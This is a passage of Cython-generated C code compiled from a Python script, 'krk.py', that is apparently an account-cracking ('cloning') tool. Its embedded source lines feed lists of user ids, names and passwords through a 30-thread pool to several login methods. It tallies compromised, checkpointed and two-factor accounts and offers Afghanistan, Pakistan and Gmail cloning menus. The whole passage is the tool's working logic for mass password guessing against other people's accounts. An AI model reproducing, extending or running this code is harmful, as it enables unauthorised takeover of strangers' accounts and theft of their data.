                        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 4+__pyx_t_7);
                        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
                        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 160, __pyx_L47_error)
                        __Pyx_GOTREF(__pyx_t_4);
                        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                      }
                      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

                      /* "krk.py":159
 *                                                 if mthd in ['1','01']:
 *                                                         crack_submit.submit(ffb,ids,names,passlist)
 *                                                 elif mthd in ['2','02']:             # <<<<<<<<<<<<<<
 *                                                         crack_submit.submit(api,ids,names,passlist)
 *                                                 else:
 */
                      goto __pyx_L57;
                    }

                    /* "krk.py":162
 *                                                         crack_submit.submit(api,ids,names,passlist)
 *                                                 else:
 *                                                         crack_submit.submit(api1,ids,names,passlist)             # <<<<<<<<<<<<<<
 *                                 print('\033[1;37m')
 *                                 linex()
 */
                    /*else*/ {
                      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_crack_submit, __pyx_n_s_submit); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 162, __pyx_L47_error)
                      __Pyx_GOTREF(__pyx_t_6);
                      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_api1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 162, __pyx_L47_error)
                      __Pyx_GOTREF(__pyx_t_5);
                      __pyx_t_15 = NULL;
                      __pyx_t_7 = 0;
                      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                        __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_6);
                        if (likely(__pyx_t_15)) {
                          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                          __Pyx_INCREF(__pyx_t_15);
                          __Pyx_INCREF(function);
                          __Pyx_DECREF_SET(__pyx_t_6, function);
                          __pyx_t_7 = 1;
                        }
                      }
                      {
                        PyObject *__pyx_callargs[5] = {__pyx_t_15, __pyx_t_5, __pyx_v_ids, __pyx_v_names, __pyx_v_passlist};
                        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 4+__pyx_t_7);
                        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
                        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 162, __pyx_L47_error)
                        __Pyx_GOTREF(__pyx_t_4);
                        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                      }
                      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                    }
                    __pyx_L57:;

                    /* "krk.py":154
 *                                         print("\x1b[1;93m Please Wait Cloning started...")
 *                                         linex()
 *                                         for user in fo:             # <<<<<<<<<<<<<<
 *                                                 ids,names = user.split('|')
 *                                                 passlist = plist
 */
                  }
                  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

                  /* "krk.py":147
 *                                 else:
 *                                         pcp.append('n')
 *                                 with tred(max_workers=30) as crack_submit:             # <<<<<<<<<<<<<<
 *                                         clear()
 *                                         total_ids = str(len(fo))
 */
                }
                __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
                __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                goto __pyx_L52_try_end;
                __pyx_L47_error:;
                __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
                __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
                __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                /*except:*/ {
                  __Pyx_AddTraceback("krk.menu", __pyx_clineno, __pyx_lineno, __pyx_filename);
                  if (__Pyx_GetException(&__pyx_t_13, &__pyx_t_4, &__pyx_t_6) < 0) __PYX_ERR(0, 147, __pyx_L49_except_error)
                  __Pyx_XGOTREF(__pyx_t_13);
                  __Pyx_XGOTREF(__pyx_t_4);
                  __Pyx_XGOTREF(__pyx_t_6);
                  __pyx_t_5 = PyTuple_Pack(3, __pyx_t_13, __pyx_t_4, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 147, __pyx_L49_except_error)
                  __Pyx_GOTREF(__pyx_t_5);
                  __pyx_t_23 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_5, NULL);
                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                  if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 147, __pyx_L49_except_error)
                  __Pyx_GOTREF(__pyx_t_23);
                  __pyx_t_8 = __Pyx_PyObject_IsTrue(__pyx_t_23);
                  __Pyx_DECREF(__pyx_t_23); __pyx_t_23 = 0;
                  if (__pyx_t_8 < 0) __PYX_ERR(0, 147, __pyx_L49_except_error)
                  __pyx_t_9 = (!__pyx_t_8);
                  if (unlikely(__pyx_t_9)) {
                    __Pyx_GIVEREF(__pyx_t_13);
                    __Pyx_GIVEREF(__pyx_t_4);
                    __Pyx_XGIVEREF(__pyx_t_6);
                    __Pyx_ErrRestoreWithState(__pyx_t_13, __pyx_t_4, __pyx_t_6);
                    __pyx_t_13 = 0; __pyx_t_4 = 0; __pyx_t_6 = 0; 
                    __PYX_ERR(0, 147, __pyx_L49_except_error)
                  }
                  __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
                  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                  goto __pyx_L48_exception_handled;
                }
                __pyx_L49_except_error:;
                __Pyx_XGIVEREF(__pyx_t_11);
                __Pyx_XGIVEREF(__pyx_t_12);
                __Pyx_XGIVEREF(__pyx_t_21);
                __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_21);
                goto __pyx_L3_error;
                __pyx_L48_exception_handled:;
                __Pyx_XGIVEREF(__pyx_t_11);
                __Pyx_XGIVEREF(__pyx_t_12);
                __Pyx_XGIVEREF(__pyx_t_21);
                __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_21);
                __pyx_L52_try_end:;
              }
            }
            /*finally:*/ {
              /*normal exit:*/{
                if (__pyx_t_10) {
                  __pyx_t_21 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_tuple__26, NULL);
                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                  if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 147, __pyx_L3_error)
                  __Pyx_GOTREF(__pyx_t_21);
                  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                }
                goto __pyx_L46;
              }
              __pyx_L46:;
            }
            goto __pyx_L66;
            __pyx_L43_error:;
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            goto __pyx_L3_error;
            __pyx_L66:;
          }

          /* "krk.py":163
 *                                                 else:
 *                                                         crack_submit.submit(api1,ids,names,passlist)
 *                                 print('\033[1;37m')             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 print(' The process has completed')
 */
          __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__27, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 163, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

          /* "krk.py":164
 *                                                         crack_submit.submit(api1,ids,names,passlist)
 *                                 print('\033[1;37m')
 *                                 linex()             # <<<<<<<<<<<<<<
 *                                 print(' The process has completed')
 *                                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 */
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_linex); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 164, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_13 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_13)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_13);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_13, };
            __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 164, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          }
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

          /* "krk.py":165
 *                                 print('\033[1;37m')
 *                                 linex()
 *                                 print(' The process has completed')             # <<<<<<<<<<<<<<
 *                                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 *                                 linex()
 */
          __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__28, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 165, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

          /* "krk.py":166
 *                                 linex()
 *                                 print(' The process has completed')
 *                                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 input(' Press enter to back ')
 */
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_oks); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_17 = PyObject_Length(__pyx_t_6); if (unlikely(__pyx_t_17 == ((Py_ssize_t)-1))) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = PyInt_FromSsize_t(__pyx_t_17); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = PyNumber_Add(__pyx_kp_s_Total_OK_CP_2F, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_4 = PyNumber_Add(__pyx_t_6, __pyx_kp_s__29); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_cps); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_17 = PyObject_Length(__pyx_t_6); if (unlikely(__pyx_t_17 == ((Py_ssize_t)-1))) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = PyInt_FromSsize_t(__pyx_t_17); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_13 = __Pyx_PyObject_Str(__pyx_t_6); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = PyNumber_Add(__pyx_t_4, __pyx_t_13); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          __pyx_t_13 = PyNumber_Add(__pyx_t_6, __pyx_kp_s__29); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_twf); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_17 = PyObject_Length(__pyx_t_6); if (unlikely(__pyx_t_17 == ((Py_ssize_t)-1))) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = PyInt_FromSsize_t(__pyx_t_17); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = PyNumber_Add(__pyx_t_13, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 166, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":167
 *                                 print(' The process has completed')
 *                                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 *                                 linex()             # <<<<<<<<<<<<<<
 *                                 input(' Press enter to back ')
 *                                 os.system('python ZEA.py')
 */
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 167, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_13 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_13)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_13);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_13, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 167, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":168
 *                                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 *                                 linex()
 *                                 input(' Press enter to back ')             # <<<<<<<<<<<<<<
 *                                 os.system('python ZEA.py')
 *                         elif xd in ['4','04']:
 */
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__30, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 168, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":169
 *                                 linex()
 *                                 input(' Press enter to back ')
 *                                 os.system('python ZEA.py')             # <<<<<<<<<<<<<<
 *                         elif xd in ['4','04']:
 *                                 import dump
 */
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_os); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 169, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_system); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 169, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_13))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_13);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_13, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_6, __pyx_kp_s_python_ZEA_py};
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_13, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 169, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":84
 *                         linex()
 *                         xd=input(' Choose an option: ')
 *                         if xd in ['1','01']:             # <<<<<<<<<<<<<<
 *                                 clear()
 *                                 print(' Put file example:  /sdcard/File.txt ')
 */
          goto __pyx_L10;
        }

        /* "krk.py":170
 *                                 input(' Press enter to back ')
 *                                 os.system('python ZEA.py')
 *                         elif xd in ['4','04']:             # <<<<<<<<<<<<<<
 *                                 import dump
 *                                 dump.Main()
 */
        __Pyx_INCREF(__pyx_v_xd);
        __pyx_t_4 = __pyx_v_xd;
        __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_4, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 170, __pyx_L3_error)
        if (!__pyx_t_8) {
        } else {
          __pyx_t_9 = __pyx_t_8;
          goto __pyx_L67_bool_binop_done;
        }
        __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_04, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 170, __pyx_L3_error)
        __pyx_t_9 = __pyx_t_8;
        __pyx_L67_bool_binop_done:;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_8 = __pyx_t_9;
        if (__pyx_t_8) {

          /* "krk.py":171
 *                                 os.system('python ZEA.py')
 *                         elif xd in ['4','04']:
 *                                 import dump             # <<<<<<<<<<<<<<
 *                                 dump.Main()
 *                         elif xd in ['6','06']:
 */
          __pyx_t_4 = __Pyx_ImportDottedModule(__pyx_n_s_dump, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 171, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_v_dump = __pyx_t_4;
          __pyx_t_4 = 0;

          /* "krk.py":172
 *                         elif xd in ['4','04']:
 *                                 import dump
 *                                 dump.Main()             # <<<<<<<<<<<<<<
 *                         elif xd in ['6','06']:
 *                                 public()
 */
          __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_v_dump, __pyx_n_s_Main); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 172, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          __pyx_t_6 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_13))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_13);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_13, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_6, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_13, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 172, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":170
 *                                 input(' Press enter to back ')
 *                                 os.system('python ZEA.py')
 *                         elif xd in ['4','04']:             # <<<<<<<<<<<<<<
 *                                 import dump
 *                                 dump.Main()
 */
          goto __pyx_L10;
        }

        /* "krk.py":173
 *                                 import dump
 *                                 dump.Main()
 *                         elif xd in ['6','06']:             # <<<<<<<<<<<<<<
 *                                 public()
 *                         elif xd in ['2','02']:
 */
        __Pyx_INCREF(__pyx_v_xd);
        __pyx_t_4 = __pyx_v_xd;
        __pyx_t_9 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_6, Py_EQ)); if (unlikely((__pyx_t_9 < 0))) __PYX_ERR(0, 173, __pyx_L3_error)
        if (!__pyx_t_9) {
        } else {
          __pyx_t_8 = __pyx_t_9;
          goto __pyx_L69_bool_binop_done;
        }
        __pyx_t_9 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_06, Py_EQ)); if (unlikely((__pyx_t_9 < 0))) __PYX_ERR(0, 173, __pyx_L3_error)
        __pyx_t_8 = __pyx_t_9;
        __pyx_L69_bool_binop_done:;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_9 = __pyx_t_8;
        if (__pyx_t_9) {

          /* "krk.py":174
 *                                 dump.Main()
 *                         elif xd in ['6','06']:
 *                                 public()             # <<<<<<<<<<<<<<
 *                         elif xd in ['2','02']:
 *                                 clear()
 */
          __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_public); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 174, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          __pyx_t_6 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_13))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_13);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_13, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_6, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_13, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 174, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":173
 *                                 import dump
 *                                 dump.Main()
 *                         elif xd in ['6','06']:             # <<<<<<<<<<<<<<
 *                                 public()
 *                         elif xd in ['2','02']:
 */
          goto __pyx_L10;
        }

        /* "krk.py":175
 *                         elif xd in ['6','06']:
 *                                 public()
 *                         elif xd in ['2','02']:             # <<<<<<<<<<<<<<
 *                                 clear()
 *                                 print(' [1] Afghanistan cloning\n [2] Pakistan cloning\n [3] Gmail cloning\n [0] Back menu')
 */
        __Pyx_INCREF(__pyx_v_xd);
        __pyx_t_4 = __pyx_v_xd;
        __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_2, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 175, __pyx_L3_error)
        if (!__pyx_t_8) {
        } else {
          __pyx_t_9 = __pyx_t_8;
          goto __pyx_L71_bool_binop_done;
        }
        __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_02, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 175, __pyx_L3_error)
        __pyx_t_9 = __pyx_t_8;
        __pyx_L71_bool_binop_done:;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_8 = __pyx_t_9;
        if (__pyx_t_8) {

          /* "krk.py":176
 *                                 public()
 *                         elif xd in ['2','02']:
 *                                 clear()             # <<<<<<<<<<<<<<
 *                                 print(' [1] Afghanistan cloning\n [2] Pakistan cloning\n [3] Gmail cloning\n [0] Back menu')
 *                                 linex()
 */
          __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_clear); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 176, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          __pyx_t_6 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_13))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_13);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_13, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_6, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_13, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 176, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":177
 *                         elif xd in ['2','02']:
 *                                 clear()
 *                                 print(' [1] Afghanistan cloning\n [2] Pakistan cloning\n [3] Gmail cloning\n [0] Back menu')             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 x=input(' Choose: ')
 */
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__32, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 177, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":178
 *                                 clear()
 *                                 print(' [1] Afghanistan cloning\n [2] Pakistan cloning\n [3] Gmail cloning\n [0] Back menu')
 *                                 linex()             # <<<<<<<<<<<<<<
 *                                 x=input(' Choose: ')
 *                                 if x in ['1','01']:
 */
          __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_linex); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 178, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          __pyx_t_6 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_13))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_13);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_13, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_6, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_13, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 178, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":179
